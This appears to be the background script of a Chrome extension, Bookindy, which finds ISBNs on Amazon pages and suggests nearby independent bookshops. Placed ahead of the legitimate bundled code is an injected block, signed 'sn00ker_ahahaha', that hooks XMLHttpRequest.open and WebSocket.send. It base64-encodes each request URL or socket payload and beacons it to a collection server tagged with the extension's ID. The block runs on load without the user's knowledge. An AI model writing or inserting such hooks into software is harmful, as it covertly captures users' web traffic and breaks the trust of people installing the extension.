function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function a(b,c,d){function e(g,h){if(!c[g]){if(!b[g]){var i="function"==typeof require&&require;if(!h&&i)return i(g,!0);if(f)return f(g,!0);var j=new Error("Cannot find module '"+g+"'");throw j.code="MODULE_NOT_FOUND",j}var k=c[g]={exports:{}};b[g][0].call(k.exports,function(a){var c=b[g][1][a];return e(c?c:a)},k,k.exports,a,b,c,d)}return c[g].exports}for(var f="function"==typeof require&&require,g=0;g<d.length;g++)e(d[g]);return e}({1:[function(a,b,c){"use strict";function d(a){for(;a.length%3!=0&&a.length>0;)a="0"+a;for(var b="";a.length>0;){var c=a.substr(a.length-3,3),d=parseInt(c,16),e=Math.floor(d/64),f=d%64;b=m.substr(e,1)+m.substr(f,1)+b,a=a.substr(0,a.length-3)}return b}function e(a){for(;a.length%2!=0&&a.length>0;)a="0"+a;for(var b="";a.length>0;){var c=a.substr(-2),d=m.indexOf(c[0]),e=m.indexOf(c[1]),f=64*d+e,g="00"+f.toString(16);b=g.substr(-3)+b,a=a.substr(0,a.length-2)}return b.length%2==1&&"0"==b[0]&&(b=b.substr(1)),b}function f(a){return"string"==typeof a&&(a=parseInt(a)),a.toString(16)}function g(a){for(var b=parseInt(a,16),c=b.length<11?10:13;b.length<c;)b="0"+b;return b}function h(a){return"string"==typeof a&&(a=parseInt(a)),a.toString(36)}function i(a){for(var b=parseInt(a,36),c=b.length<11?10:13;b.length<c;)b="0"+b;return b}function j(a){var b=f(a);return d(b)}function k(a){var b=e(a);return g(b)}var l;!function(){l={VERSION:"0.01",GROUPS:{0:{name:"English speaking area",ranges:[["00","19"],["200","699"],["7000","8499"],["85000","89999"],["900000","949999"],["9500000","9999999"]]},1:{name:"English speaking area",ranges:[["00","09"],["100","399"],["4000","5499"],["55000","86979"],["869800","998999"]]},4:{name:"Japan",ranges:[["00","19"],["200","699"],["7000","8499"],["85000","89999"],["900000","949999"],["9500000","9999999"]]}},isbn:function(){this.initialize.apply(this,arguments)},parse:function(a,b){var c=new l.isbn(a,b?b:l.GROUPS);return c.isValid()?c:null},hyphenate:function(a){var b=l.parse(a);return b?b.isIsbn13()?b.asIsbn13(!0):b.asIsbn10(!0):null},asIsbn13:function(a,b){var c=l.parse(a);return c?c.asIsbn13(b):null},asIsbn10:function(a,b){var c=l.parse(a);return c?c.asIsbn10(b):null}},l.isbn.prototype={isValid:function(){return this.codes&&this.codes.isValid},isIsbn13:function(){return this.isValid()&&this.codes.isIsbn13},isIsbn10:function(){return this.isValid()&&this.codes.isIsbn10},asIsbn10:function(a){return this.isValid()?a?this.codes.isbn10h:this.codes.isbn10:null},asIsbn13:function(a){return this.isValid()?a?this.codes.isbn13h:this.codes.isbn13:null},initialize:function(a,b){this.groups=b,this.codes=this.parse(a)},merge:function(a,b){var c;if(!a||!b)return null;for(c in b)b.hasOwnProperty(c)&&(a[c]=b[c]);return a},parse:function(a){var b;return b=a.match(/^\d{9}[\dX]$/)?this.fill(this.merge({source:a,isValid:!0,isIsbn10:!0,isIsbn13:!1},this.split(a))):13===a.length&&a.match(/^(\d+)-(\d+)-(\d+)-([\dX])$/)?this.fill({source:a,isValid:!0,isIsbn10:!0,isIsbn13:!1,group:RegExp.$1,publisher:RegExp.$2,article:RegExp.$3,check:RegExp.$4}):a.match(/^(978|979)(\d{9}[\dX]$)/)?this.fill(this.merge({source:a,isValid:!0,isIsbn10:!1,isIsbn13:!0,prefix:RegExp.$1},this.split(RegExp.$2))):17===a.length&&a.match(/^(978|979)-(\d+)-(\d+)-(\d+)-([\dX])$/)?this.fill({source:a,isValid:!0,isIsbn10:!1,isIsbn13:!0,prefix:RegExp.$1,group:RegExp.$2,publisher:RegExp.$3,article:RegExp.$4,check:RegExp.$5}):null,b?this.merge(b,{isValid:b.check===(b.isIsbn13?b.check13:b.check10)}):{source:a,isValid:!1}},split:function(a){return a?13===a.length?this.merge(this.split(a.substr(3)),{prefix:a.substr(0,3)}):10===a.length?this.splitToObject(a):null:null},splitToArray:function(a){var b,c,d,e,f;if(b=this.getGroupRecord(a),!b)return null;for(e=0,f=b.record.ranges.length;f>e;e+=1)if(c=b.rest.substr(0,b.record.ranges[e][0].length),b.record.ranges[e][0]<=c&&b.record.ranges[e][1]>=c)return d=b.rest.substr(c.length),[b.group,c,d.substr(0,d.length-1),d.charAt(d.length-1)];return null},splitToObject:function(a){var b=this.splitToArray(a);return b&&4===b.length?{group:b[0],publisher:b[1],article:b[2],check:b[3]}:null},fill:function(a){var b,c,d,e,f,g;return a&&(b=this.groups[a.group])?(c=a.prefix?a.prefix:"978",(d=this.calcCheckDigit([a.group,a.publisher,a.article].join("")))&&(e=this.calcCheckDigit([c,a.group,a.publisher,a.article].join("")))?(f=[c,a.group,a.publisher,a.article,e],this.merge(a,{isbn13:f.join(""),isbn13h:f.join("-"),check10:d,check13:e,groupname:b.name}),"978"===c&&(g=[a.group,a.publisher,a.article,d],this.merge(a,{isbn10:g.join(""),isbn10h:g.join("-")})),a):null):null},getGroupRecord:function(a){var b;for(b in this.groups)if(a.match("^"+b+"(.+)"))return{group:b,record:this.groups[b],rest:RegExp.$1};return null},calcCheckDigit:function(a){var b,c;if(a.match(/^\d{9}[\dX]?$/)){for(b=0,c=0;9>c;c+=1)b+=(10-c)*a.charAt(c);return b=(11-b%11)%11,10===b?"X":String(b)}if(a.match(/(?:978|979)\d{9}[\dX]?/)){for(b=0,c=0;12>c;c+=2)b+=Number(a.charAt(c))+3*a.charAt(c+1);return String((10-b%10)%10)}return null}}}();var m="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz~";b.exports=l,b.exports.to16=f,b.exports.from16=g,b.exports.to36=h,b.exports.from36=i,b.exports.to64=j,b.exports.from64=k},{}],2:[function(a,b,c){"use strict";function d(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(c,"__esModule",{value:!0});var e=function(){function a(a,b){for(var c=0;c<b.length;c++){var d=b[c];d.enumerable=d.enumerable||!1,d.configurable=!0,"value"in d&&(d.writable=!0),Object.defineProperty(a,d.key,d)}}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}(),f=function(){function a(){d(this,a)}return e(a,[{key:"fetchStoreData",value:function(a,b){var c=this;return new Promise(function(d,e){var f=localStorage.getItem("Bookindy.rawStoreData?v=2");if(f)try{return void d(c.getNearestStore(JSON.parse(f),a,b))}catch(g){}fetch("https://spreadsheets.google.com/feeds/list/1w8qElqMYB9X63U-8zUzNNCdS3H0Ampyfu_1nsdYVygQ/default/public/values?alt=json").then(function(a){return a.json()}).then(function(e){localStorage.setItem("Bookindy.rawStoreData?v=2",JSON.stringify(e)),d(c.getNearestStore(e,a,b))})["catch"](function(a){e(a)})})}},{key:"getNearestStore",value:function(a,b,c){for(var d,e,f=a.feed.entry,g=0,h=f.length;h>g;g++){var i="http://track.webgains.com/click.html?wgcampaignid=179695&wgprogramid=10671&wgtarget="+f[g].gsx$bookshophivepage.$t;e={name:f[g].title.$t,lat:f[g].gsx$latitude.$t,"long":f[g].gsx$longitude.$t,url:i},e._distance=this.getDistanceFromLatLonInKm(b.coords.longitude,b.coords.latitude,e["long"],e.lat),e.distance=e._distance.toFixed(1),c?(!d&&e._distance<c||d&&e._distance<d._distance)&&(d=e):(!d||e._distance<d._distance)&&(d=e)}return d}},{key:"getDistanceFromLatLonInKm",value:function(a,b,c,d){var e=3959,f=this.deg2rad(c-a),g=this.deg2rad(d-b),h=Math.sin(f/2)*Math.sin(f/2)+Math.cos(this.deg2rad(a))*Math.cos(this.deg2rad(c))*Math.sin(g/2)*Math.sin(g/2),i=2*Math.atan2(Math.sqrt(h),Math.sqrt(1-h)),j=e*i;return j}},{key:"deg2rad",value:function(a){return a*(Math.PI/180)}},{key:"getUserLocation",value:function(){return new Promise(function(a,b){navigator.geolocation.getCurrentPosition(function(b){a(b)},function(a){b(a)},{maximumAge:3e5})})}},{key:"locateStore",value:function(a){var b=this;return this.getUserLocation().then(function(c){return b.fetchStoreData(c,a&&a.maxDistance).then(function(a){return a})})}}]),a}();c["default"]=f,b.exports=c["default"]},{}],3:[function(a,b,c){"use strict";Object.defineProperty(c,"__esModule",{value:!0}),c["default"]=function(){window._gaq=window._gaq||[],window._gaq.push(["_setAccount","UA-62584600-1"]),function(){var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src="https://ssl.google-analytics.com/ga.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)}(),chrome.runtime.onMessage.addListener(function(a){a.bookindyAnalyticsAction&&(console.info("BOOKINDY: Tracked  "+a.bookindyAnalyticsCategory+" "+a.bookindyAnalyticsAction+" "+a.bookindyAnalyticsLabel),window._gaq.push(["_trackEvent",a.bookindyAnalyticsCategory,a.bookindyAnalyticsAction,a.bookindyAnalyticsLabel]))})},b.exports=c["default"]},{}],4:[function(a,b,c){"use strict";function d(a){return a&&a.__esModule?a:{"default":a}}function e(a){var b=document.createElement("a");return b.href=a,b.hostname}function f(){console.log("Fresh Bookindy install"),chrome.tabs.create({url:"http://bookindy.com/success.html"})}var g=a("./analytics"),h=d(g);h["default"]();var i={},j={"www.amazon.co.uk":a("./tabs/uk"),"www.amazon.com":a("./tabs/us")};chrome.runtime.onInstalled.addListener(function(a){chrome.storage.sync.clear(),"install"===a.reason&&f()}),chrome.tabs.onUpdated.addListener(function(a,b,c){var d=e(c.url),f=j[d];console.log(a,b,c),console.log("hostname is ",d),"complete"===b.status&&!i[a]&&f&&(console.log("tab initialised with id "+a),i[a]=new f(c),i[a].init()),"loading"===b.status&&i[a]&&(delete i[a],console.log("tab destroyed with id "+a))}),chrome.tabs.onRemoved.addListener(function(a){i[a]&&(delete i[a],console.log("tab destroyed with id "+a))})},{"./analytics":3,"./tabs/uk":6,"./tabs/us":7}],5:[function(a,b,c){"use strict";function d(a){return a&&a.__esModule?a:{"default":a}}function e(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(c,"__esModule",{value:!0});var f=function(){function a(a,b){for(var c=0;c<b.length;c++){var d=b[c];d.enumerable=d.enumerable||!1,d.configurable=!0,"value"in d&&(d.writable=!0),Object.defineProperty(a,d.key,d)}}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}(),g=a("isbnjs"),h=d(g),i=a("../../../bower_components/bookindy-client/dist/bookindy.js"),j=d(i),k=function(){function a(b){e(this,a),this.tab=b,this.storeClient=new j["default"]}return f(a,[{key:"init",value:function(){var a=this.extractISBN(this.tab.url);chrome.tabs.sendMessage(this.tab.id,{eventName:"isbnMatched",data:a}),this.locateStorePromise=this.storeClient.locateStore(),a&&this.fetchProduct(a).then(this.deserializeProduct).then(this.productMatchSuccess.bind(this),this.productMatchFailed)}},{key:"productMatchSuccess",value:function(a){var b=this;return a.price?(console.info("BOOKINDY: Product Link Generated: "+a.affiliateURL),chrome.tabs.sendMessage(this.tab.id,{eventName:"productFound",data:a}),void this.locateStorePromise.then(function(a){chrome.tabs.sendMessage(b.tab.id,{eventName:"storeLocated",data:a})},function(){console.error("BOOKINDY: Failed to locate nearest store")})):void this.productMatchFailed()}},{key:"productMatchFailed",value:function(){console.error("BOOKINDY: Failed to fetch product from affiliate")}},{key:"extractISBN",value:function(a){var b=a.match(/[0-9,X]{10}/),c=void 0;if(b){for(var d=0;d<b.length;d++)if(c=h["default"].parse(b[d]))return console.info("BOOKINDY: Valid ISBN matched:",c.asIsbn10()),this.convertISBN(c);console.info("BOOKINDY: Failed to match ISBN is url")}}},{key:"convertISBN",value:function(a){return a.asIsbn13()}}]),a}();c["default"]=k,b.exports=c["default"]},{"../../../bower_components/bookindy-client/dist/bookindy.js":2,isbnjs:1}],6:[function(a,b,c){"use strict";function d(a){return a&&a.__esModule?a:{"default":a}}function e(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}function f(a,b){if("function"!=typeof b&&null!==b)throw new TypeError("Super expression must either be null or a function, not "+typeof b);a.prototype=Object.create(b&&b.prototype,{constructor:{value:a,enumerable:!1,writable:!0,configurable:!0}}),b&&(a.__proto__=b)}Object.defineProperty(c,"__esModule",{value:!0});var g=function(){function a(a,b){for(var c=0;c<b.length;c++){var d=b[c];d.enumerable=d.enumerable||!1,d.configurable=!0,"value"in d&&(d.writable=!0),Object.defineProperty(a,d.key,d)}}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}(),h=a("./base"),i=d(h),j=function(a){function b(){e(this,b),null!=a&&a.apply(this,arguments)}return f(b,a),g(b,[{key:"deserializeProduct",value:function(a){var b={},c=a.getElementsByTagName("item")[0].children;return[].slice.call(c).forEach(function(a){return b[a.tagName]=a.innerHTML}),b.productId=b.detailPageURL.split("/")[b.detailPageURL.split("/").length-2],b.affiliateURL="http://track.webgains.com/click.html?wgcampaignid=179695&wgprogramid=10671&wgtarget="+b.detailPageURL,b.pencePrice=100*parseFloat(b.price),b}},{key:"fetchProduct",value:function(a){return fetch("http://plu.hive.co.uk/ProductDetails/"+a+"/?token=HiveToken").then(function(a){return a.text()}).then(function(a){var b=new DOMParser,c=b.parseFromString(a,"application/xml");return c})["catch"](function(){console.error("BOOKINDY: Failed to fetch product from Hive")})}}]),b}(i["default"]);c["default"]=j,b.exports=c["default"]},{"./base":5}],7:[function(a,b,c){"use strict";function d(a){return a&&a.__esModule?a:{"default":a}}function e(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}function f(a,b){if("function"!=typeof b&&null!==b)throw new TypeError("Super expression must either be null or a function, not "+typeof b);a.prototype=Object.create(b&&b.prototype,{constructor:{value:a,enumerable:!1,writable:!0,configurable:!0}}),b&&(a.__proto__=b)}Object.defineProperty(c,"__esModule",{value:!0});var g=function(){function a(a,b){for(var c=0;c<b.length;c++){var d=b[c];d.enumerable=d.enumerable||!1,d.configurable=!0,"value"in d&&(d.writable=!0),Object.defineProperty(a,d.key,d)}}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}(),h=a("./base"),i=d(h),j=function(a){function b(){e(this,b),null!=a&&a.apply(this,arguments)}return f(b,a),g(b,[{key:"init",value:function(){var a=this,b=this.extractISBN(this.tab.url);b&&(console.log("Bookindy initialized on amazon.com"),chrome.tabs.sendMessage(this.tab.id,{eventName:"isbnMatched",data:b}),chrome.storage.sync.get("unsupportedMessageDismissed",function(b){b.unsupportedMessageDismissed||chrome.tabs.sendMessage(a.tab.id,{eventName:"domainNotSupported"})}))}}]),b}(i["default"]);c["default"]=j,b.exports=c["default"]},{"./base":5}]},{},[3,4]);